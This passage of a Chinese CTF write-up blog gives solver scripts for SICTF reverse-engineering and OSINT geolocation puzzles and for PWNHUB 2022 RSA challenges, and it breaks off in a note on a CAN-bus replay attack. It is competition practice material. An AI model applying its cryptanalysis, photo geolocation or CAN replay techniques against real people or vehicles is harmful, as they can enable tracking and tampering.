CALL_FUNCTION            <span class="hljs-number">0</span><br>           <span class="hljs-number">94</span> STORE_NAME               <span class="hljs-number">2</span> (flag)<br><br><span class="hljs-number">3</span>          <span class="hljs-number">96</span> LOAD_CONST              <span class="hljs-number">23</span> (<span class="hljs-number">0</span>)<br>           <span class="hljs-number">98</span> STORE_NAME               <span class="hljs-number">3</span> (true)<br><br><span class="hljs-number">4</span>         <span class="hljs-number">100</span> SETUP_LOOP              <span class="hljs-number">52</span> (to <span class="hljs-number">154</span>)<br>          <span class="hljs-number">102</span> LOAD_NAME                <span class="hljs-number">4</span> (<span class="hljs-built_in">range</span>)<br>          <span class="hljs-number">104</span> LOAD_NAME                <span class="hljs-number">5</span> (<span class="hljs-built_in">len</span>)<br>          <span class="hljs-number">106</span> LOAD_NAME                <span class="hljs-number">2</span> (flag)<br>          <span class="hljs-number">108</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>          <span class="hljs-number">110</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>          <span class="hljs-number">112</span> GET_ITER<br>      &gt;&gt;  <span class="hljs-number">114</span> FOR_ITER                <span class="hljs-number">36</span> (to <span class="hljs-number">152</span>)<br>          <span class="hljs-number">116</span> STORE_NAME               <span class="hljs-number">6</span> (i)<br><br><span class="hljs-number">5</span>         <span class="hljs-number">118</span> LOAD_NAME                <span class="hljs-number">7</span> (<span class="hljs-built_in">ord</span>)<br>          <span class="hljs-number">120</span> LOAD_NAME                <span class="hljs-number">2</span> (flag)<br>          <span class="hljs-number">122</span> LOAD_NAME                <span class="hljs-number">6</span> (i)<br>          <span class="hljs-number">124</span> BINARY_SUBSCR<br>          <span class="hljs-number">126</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>          <span class="hljs-number">128</span> LOAD_CONST              <span class="hljs-number">24</span> (<span class="hljs-number">114514</span>)<br>          <span class="hljs-number">130</span> BINARY_XOR<br>          <span class="hljs-number">132</span> LOAD_NAME                <span class="hljs-number">0</span> (flags)<br>          <span class="hljs-number">134</span> LOAD_NAME                <span class="hljs-number">6</span> (i)<br>          <span class="hljs-number">136</span> BINARY_SUBSCR<br>          <span class="hljs-number">138</span> COMPARE_OP               <span class="hljs-number">2</span> (==)<br>          <span class="hljs-number">140</span> POP_JUMP_IF_FALSE      <span class="hljs-number">114</span><br><br><span class="hljs-number">6</span>         <span class="hljs-number">142</span> LOAD_NAME                <span class="hljs-number">3</span> (true)<br>          <span class="hljs-number">144</span> LOAD_CONST              <span class="hljs-number">25</span> (<span class="hljs-number">1</span>)<br>          <span class="hljs-number">146</span> INPLACE_ADD<br>          <span class="hljs-number">148</span> STORE_NAME               <span class="hljs-number">3</span> (true)<br>          <span class="hljs-number">150</span> JUMP_ABSOLUTE          <span class="hljs-number">114</span><br>      &gt;&gt;  <span class="hljs-number">152</span> POP_BLOCK<br><br><span class="hljs-number">7</span>     &gt;&gt;  <span class="hljs-number">154</span> LOAD_NAME                <span class="hljs-number">3</span> (true)<br>          <span class="hljs-number">156</span> LOAD_NAME                <span class="hljs-number">5</span> (<span class="hljs-built_in">len</span>)<br>          <span class="hljs-number">158</span> LOAD_NAME                <span class="hljs-number">0</span> (flags)<br>          <span class="hljs-number">160</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>          <span class="hljs-number">162</span> COMPARE_OP               <span class="hljs-number">2</span> (==)<br>          <span class="hljs-number">164</span> POP_JUMP_IF_FALSE      <span class="hljs-number">174</span><br><br><span class="hljs-number">8</span>         <span class="hljs-number">166</span> LOAD_NAME                <span class="hljs-number">8</span> (<span class="hljs-built_in">print</span>)<br>          <span class="hljs-number">168</span> LOAD_CONST              <span class="hljs-number">26</span> (<span class="hljs-string">&#x27;True!&#x27;</span>)<br>          <span class="hljs-number">170</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>          <span class="hljs-number">172</span> POP_TOP<br>      &gt;&gt;  <span class="hljs-number">174</span> LOAD_CONST              <span class="hljs-number">27</span> (<span class="hljs-literal">None</span>)<br>          <span class="hljs-number">176</span> RETURN_VALUE<br></code></pre></td></tr></table></figure><blockquote><p>根据字节码还原python脚本 </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">flags = [<span class="hljs-number">114433</span>, <span class="hljs-number">114459</span>, <span class="hljs-number">114449</span>, <span class="hljs-number">114438</span>, <span class="hljs-number">114452</span>, <span class="hljs-number">114473</span>, <span class="hljs-number">114480</span>, <span class="hljs-number">114530</span>, <span class="hljs-number">114531</span>, <span class="hljs-number">114487</span>, <span class="hljs-number">114528</span>, <span class="hljs-number">114483</span>, <span class="hljs-number">114531</span>, <span class="hljs-number">114484</span>, <span class="hljs-number">114559</span>, <span class="hljs-number">114530</span>, <span class="hljs-number">114539</span>, <span class="hljs-number">114532</span>, <span class="hljs-number">114486</span>, <span class="hljs-number">114559</span>, <span class="hljs-number">114534</span>, <span class="hljs-number">114484</span>, <span class="hljs-number">114486</span>, <span class="hljs-number">114538</span>, <span class="hljs-number">114559</span>, <span class="hljs-number">114538</span>, <span class="hljs-number">114484</span>, <span class="hljs-number">114539</span>, <span class="hljs-number">114535</span>, <span class="hljs-number">114559</span>, <span class="hljs-number">114533</span>, <span class="hljs-number">114487</span>, <span class="hljs-number">114529</span>, <span class="hljs-number">114538</span>, <span class="hljs-number">114538</span>, <span class="hljs-number">114486</span>, <span class="hljs-number">114532</span>, <span class="hljs-number">114539</span>, <span class="hljs-number">114534</span>, <span class="hljs-number">114539</span>, <span class="hljs-number">114531</span>, <span class="hljs-number">114531</span>, <span class="hljs-number">114479</span>]<br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flags:<br>    flag += <span class="hljs-built_in">chr</span>(i^<span class="hljs-number">114514</span>)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#SICTF&#123;b01e2a1f-096d-4fd8-8f95-7e388d694911&#125;</span><br></code></pre></td></tr></table></figure><h4 id="Super-Mario-Bros"><a href="#Super-Mario-Bros" class="headerlink" title="Super Mario Bros"></a>Super Mario Bros</h4><p>原项目：<a href="https://github.com/heart6622/python_SuperMario">https://github.com/heart6622/python_SuperMario</a><br>用python3.10正确反编译<br>题目提示源码在./source目录下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">from</span> pwn import <span class="hljs-keyword">xor</span><br>s=[<span class="hljs-number">10</span>, <span class="hljs-number">9</span>, <span class="hljs-number">23</span>, <span class="hljs-number">2</span>, <span class="hljs-number">23</span>, <span class="hljs-number">109</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">58</span>, <span class="hljs-number">71</span>, <span class="hljs-number">22</span>, <span class="hljs-number">51</span>, <span class="hljs-number">82</span>, <span class="hljs-number">93</span>, <span class="hljs-number">20</span>, <span class="hljs-number">92</span>, <span class="hljs-number">93</span>, <span class="hljs-number">28</span>, <span class="hljs-number">41</span>, <span class="hljs-number">3</span>, <span class="hljs-number">25</span>, <span class="hljs-number">78</span>, <span class="hljs-number">0</span>, <span class="hljs-number">44</span>, <span class="hljs-number">16</span>]<br>key= <span class="hljs-string">&#x27;level num&#x27;</span><br><span class="hljs-keyword">print</span> (<span class="hljs-keyword">xor</span>(s,key))<br></code></pre></td></tr></table></figure><h4 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h4><p>xtea    算法<br>re✌的exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decipher</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num_rounds, <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">6</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++) &#123;<br>        <span class="hljs-type">uint32_t</span>  delta = <span class="hljs-number">0x61C88647</span>, sum = delta * num_rounds;<br>        <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">2</span> * j], v1 = v[<span class="hljs-number">2</span> * j + <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; num_rounds; i++) &#123;<br><br>            v1 -= ((((v0 * <span class="hljs-number">8</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>])) ^ <span class="hljs-number">3</span>;<br>            sum -= delta;<br>            v0 -= (((v1 * <span class="hljs-number">8</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br>        &#125;<br><br>        v[<span class="hljs-number">2</span> * j] = v0; v[<span class="hljs-number">2</span> * j + <span class="hljs-number">1</span>] = v1;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">6</span>] = &#123; <span class="hljs-number">0xab603776</span>,<span class="hljs-number">0xb9b07148</span>,<span class="hljs-number">0xbff5ec79</span>,<span class="hljs-number">0x4e93cb5e</span>,<span class="hljs-number">0xcbb3b436</span>,<span class="hljs-number">0x41d24b4d</span> &#125;;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-number">0x12345678</span>,(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-number">0x23456789</span>,(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-number">0x34567890</span> ,(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-number">0x45678901</span> &#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r = <span class="hljs-number">32</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;加密的数据：0x%x,0x%x,0x%x,0x%x,0x%x,0x%x\n&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>], v[<span class="hljs-number">2</span>], v[<span class="hljs-number">3</span>], v[<span class="hljs-number">4</span>], v[<span class="hljs-number">5</span>]);<br>    decipher(r, v, k);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;解密后的数据：0x%x,0x%x,0x%x,0x%x,0x%x,0x%x\n&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>], v[<span class="hljs-number">2</span>], v[<span class="hljs-number">3</span>], v[<span class="hljs-number">4</span>], v[<span class="hljs-number">5</span>]);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">3</span>; j &gt;= <span class="hljs-number">0</span>; j--)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (v[i] &gt;&gt; (j * <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//flag&#123;t5a_1s_very_n1C5!!&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a>Osint</h1><h4 id="朋友圈中的秘密"><a href="#朋友圈中的秘密" class="headerlink" title="朋友圈中的秘密"></a>朋友圈中的秘密</h4><p><img src="/mdimg/sictf/38.png"><br><strong>面向出题人做题法：</strong><br><strong>一眼丁真汉堡王（桌子上的可乐）</strong><br>地图查找左上角的商家（顺义区）（树木是顺义区的）<br>范围很小，一个一个试就行<br><img src="/mdimg/sictf/39.png"><code>SICTF&#123;北京市-顺义区-新顺南大街-11号-汉堡王&#125;                        </code></p><h4 id="小镇后面的山"><a href="#小镇后面的山" class="headerlink" title="小镇后面的山"></a>小镇后面的山</h4><p><img src="/mdimg/sictf/40.png"><br>直接google识图<br><img src="/mdimg/sictf/41.png"><br>随便搜都能找到，然后查了一下这个地方，确实有一个大学<br><a href="https://www.adventurouskate.com/grenoble-on-a-perfect-winter-day/">https://www.adventurouskate.com/grenoble-on-a-perfect-winter-day/</a><br><code>SICTF&#123;格勒诺布尔-阿尔卑斯山脉&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022PWNHUB冬季赛</title>
    <link href="/2023/02/05/2022PWNHUB%E5%86%AC%E5%AD%A3%E8%B5%9BWrite%20Up/"/>
    <url>/2023/02/05/2022PWNHUB%E5%86%AC%E5%AD%A3%E8%B5%9BWrite%20Up/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/2022PWNHUB/1671426618514.jpg"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="ASR"><a href="#ASR" class="headerlink" title="ASR"></a>ASR</h2><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>m = bytes_to_long(flag)<br><br>R = getPrime(<span class="hljs-number">256</span>)<br>S = getPrime(<span class="hljs-number">512</span>)<br>A = getPrime(<span class="hljs-number">1024</span>)<br><br>N = R * S * A<br>c = <span class="hljs-built_in">pow</span>(m, <span class="hljs-number">0x10001</span>, N)<br><br>RA = R &amp; A<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;RSA1&#x27;</span>,<span class="hljs-built_in">hex</span>(RA * S))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;RSA2&#x27;</span>,<span class="hljs-built_in">hex</span>(RA | S))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-built_in">hex</span>(c))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;N&#x27;</span>,<span class="hljs-built_in">hex</span>(N))<br><br><span class="hljs-comment"># RSA1 0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br><span class="hljs-comment"># RSA2 0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br><span class="hljs-comment"># c 0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br><span class="hljs-comment"># N 0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br></code></pre></td></tr></table></figure><p>非预期解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>RSA1=<span class="hljs-number">0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br>RSA2=<span class="hljs-number">0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br>c=<span class="hljs-number">0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br>N=<span class="hljs-number">0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br><br>S=GCD(RSA1,N)<br>d=inverse(<span class="hljs-number">0x10001</span>,S-<span class="hljs-number">1</span>)<br>m=<span class="hljs-built_in">pow</span>(c,d,S)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br><span class="hljs-comment">#flag&#123;b66f68258f184bd7afddd32c1518eed0&#125;</span><br></code></pre></td></tr></table></figure><p>预期解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>RSA1=<span class="hljs-number">0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br>RSA2=<span class="hljs-number">0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br>c=<span class="hljs-number">0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br>N=<span class="hljs-number">0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br><br>offset = <span class="hljs-number">256</span><br>RSA2 &gt;&gt;= offset<br>RSA2 &lt;&lt;= offset<br><br>PR.&lt;x&gt; = PolynomialRing(Zmod(RSA1))<br>f = x + RSA2<br>roots = f.small_roots(X=<span class="hljs-number">2</span>^offset, beta = <span class="hljs-number">0.4</span>)<br>S = RSA2 + roots[<span class="hljs-number">0</span>]<br>S = <span class="hljs-built_in">int</span>(S)<br><br>cc = <span class="hljs-built_in">int</span>(c % S)<br><span class="hljs-built_in">print</span>(cc)<br>d = <span class="hljs-built_in">int</span>(inverse(<span class="hljs-number">0x10001</span>, S-<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(cc,d,S)))<br></code></pre></td></tr></table></figure><h2 id="大杂烩"><a href="#大杂烩" class="headerlink" title="大杂烩"></a>大杂烩</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-number">1755716071599</span><br>N = <span class="hljs-number">236038564943567983056828121309828109017</span><br>Px, Py =<br>b = ZZ((Py**<span class="hljs-number">2</span> - Px**<span class="hljs-number">3</span> - a * Px) % N)<br>e = (b&lt;&lt;<span class="hljs-number">42</span>) + a<br><br>enc1 = <span class="hljs-number">98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356</span><br>enc2 = <span class="hljs-number">58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204</span><br>NN = <span class="hljs-number">149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347</span><br>M = matrix(ZZ, [<br>    [<span class="hljs-number">2</span>**<span class="hljs-number">256</span>, enc1, enc2],<br>    [<span class="hljs-number">0</span>, NN, <span class="hljs-number">0</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, NN]<br>])<br>L = M.LLL()<br>hd, ld = L[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>], L[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>]<br>d = (hd&lt;&lt;<span class="hljs-number">512</span>) + ld<br><br>n = <span class="hljs-number">236038564943567983056828121309828109017</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, e*d, n) == <span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    k = e * d - <span class="hljs-number">1</span><br>    g = randint(<span class="hljs-number">2</span>, n - <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        x = <span class="hljs-built_in">pow</span>(g, k, n)<br>        <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> n &gt; GCD(x - <span class="hljs-number">1</span>, n) &gt; <span class="hljs-number">1</span>:<br>            p = GCD(x - <span class="hljs-number">1</span>, n)<br>            q = n // p<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;p = &#125;</span>\n<span class="hljs-subst">&#123;q = &#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(p * q == n)<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>                <span class="hljs-built_in">print</span>(long_to_bytes(p &gt;&gt; i))<br>                <span class="hljs-built_in">print</span>(long_to_bytes(q &gt;&gt; i))<br>            exit()<br>        <span class="hljs-keyword">if</span> k % <span class="hljs-number">2</span>:<span class="hljs-keyword">break</span><br>        k //= <span class="hljs-number">2</span><br><span class="hljs-comment"># flag&#123;e89f47939d12434cb201080d8b240774&#125;</span><br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="飞驰人生"><a href="#飞驰人生" class="headerlink" title="飞驰人生"></a>飞驰人生</h2><p>前置知识<br><code>[https://www.anquanke.com/post/id/106409?from=timeline#h2-1](https://www.anquanke.com/post/id/106409?from=timeline#h2-1)</code><br>CAN报文分析，使用重放攻击解题<br><code>[http://www.hackdig.com/09/hack-771228.htm](http://www.hackdig.com/09/hack-771228.htm)</code><br>需要去GitHub下载最新版can-utils才能实现挨个手调<br><code>[GitHub - linux-can/can-utils: Linux-CAN / SocketCAN user space applications](https://github.com/linux-can/can-utils)</code><br>查看日志 将异常流量提取出来可以更快的调试完毕<br>直接筛选244#（油门流量）的异常流量去进行手调<br><code>./canplayer -I ./xxx.txt -v -i</code>逐行调试命令<br><img 